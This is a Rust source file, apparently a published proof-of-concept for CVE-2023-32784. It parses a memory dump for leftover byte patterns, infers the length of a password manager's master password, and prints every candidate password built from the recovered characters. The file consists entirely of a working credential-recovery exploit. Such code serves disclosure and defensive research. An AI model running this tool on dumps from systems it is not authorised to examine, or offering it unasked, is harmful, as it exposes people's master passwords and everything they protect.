use clap::Parser;
use std::fs::File;
use std::io::{BufReader, Read};

/// CVE-2023-32784 proof-of-concept
#[derive(Parser)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// The path of the memory dump to analyze
    #[arg(long)]
    dump: String
}

#[derive(PartialEq)]
struct Candidate {
    pos: u16,
    c: u8
}

fn get_candidates(reader: &mut BufReader<File>) -> Result<Vec<Candidate>, std::io::Error> {
    let mut candidates = Vec::new();
    let mut str_len: u16 = 0;
    let mut old_b: u8 = 0;
    let mut skip_flag: bool = false;

    for x in reader.bytes() {
        if x.is_err() {
            return Err(x.unwrap_err());
        }

        let b = x.unwrap();

        if (old_b == 0xCF) && (b == 0x25) {
            str_len += 1;
            skip_flag = true;
        }
        else if !skip_flag && (str_len > 0) {
            if (old_b >= 0x20) && (old_b <= 0x7E) && (b == 0x00) {
                let candidate = Candidate {pos: str_len, c: old_b};

                if !candidates.contains(&candidate) {
                    candidates.push(candidate);
                }
            }

            str_len = 0;
        }
        else if skip_flag {
            skip_flag = false;
        }

        old_b = b;
    }

    Ok(candidates)
}

fn get_password_len(candidates: &Vec<Candidate>) -> u16 {
    let mut len = 0;

    for candidate in candidates.iter() {
        if candidate.pos > len {
            len = candidate.pos;
        }
    }

    len + 1 // Account for the first character not in the dump
}

// From: https://rosettacode.org/wiki/Cartesian_product_of_two_or_more_lists#Rust
fn cartesian_product(lists: &Vec<Vec<char>>) -> Vec<Vec<char>> {
    let mut res = vec![];
    let mut list_iter = lists.iter();

    if let Some(first_list) = list_iter.next() {
        for &c in first_list {
            res.push(vec![c]);
        }
    }

    for l in list_iter {
        let mut tmp = vec![];

        for r in res {
            for &el in l {
                let mut tmp_el = r.clone();
                tmp_el.push(el);
                tmp.push(tmp_el);
            }
        }

        res = tmp;
    }

    res
}

fn main() {
    let dump_file_path = Args::parse().dump;
    let dump_file = File::open(dump_file_path).expect("Unable to open the dump file");
    let mut reader = BufReader::new(dump_file);
    let candidates = get_candidates(&mut reader).expect("An error occurred while reading the dump file");
    let password_len = get_password_len(&candidates);

    println!("Password is {password_len} characters long");

    let mut groups = Vec::new();

    for _ in 0..password_len {
        groups.push(Vec::new());
    }

    for candidate in candidates.iter() {
        groups[candidate.pos as usize].push(candidate.c as char);
    }

    for group in groups.iter_mut() {
        if group.len() == 0 {
            group.push(char::REPLACEMENT_CHARACTER);
        }
    }

    for password_chars in cartesian_product(&groups) {
        let password : String = password_chars.into_iter().collect();
        println!("Possible password: {password}");
    }
}
